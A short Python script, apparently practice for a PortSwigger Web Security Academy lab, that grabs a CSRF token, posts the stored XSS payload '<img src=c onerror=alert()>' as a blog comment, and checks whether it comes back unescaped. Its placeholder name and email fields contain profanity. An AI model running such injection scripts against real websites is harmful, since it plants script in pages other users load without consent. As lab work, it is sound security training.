import requests
from bs4 import BeautifulSoup

session = requests.Session()
payload = "<img src=c onerror=alert()>"
url = "https://0ab5007004b377458035da1f00950005.web-security-academy.net/"
respose = session.get(url + "post?postId=6")
html = respose.text
soup = BeautifulSoup(html, "html.parser")
csrf = soup.find("input", {"name": "csrf"})["value"]
data = {
    "csrf": csrf,
    "postId": "6",
    "comment": payload,
    "name": "reda",
    "email": "ex@fuck.com",
    "website": "http://fuck.com",
}
respose = session.post(url + "post/comment", data=data)
print(respose.status_code)
respose = session.get(url + "post?postId=6")
if payload in respose.text:
    print("pk")
else:
    print("oh")
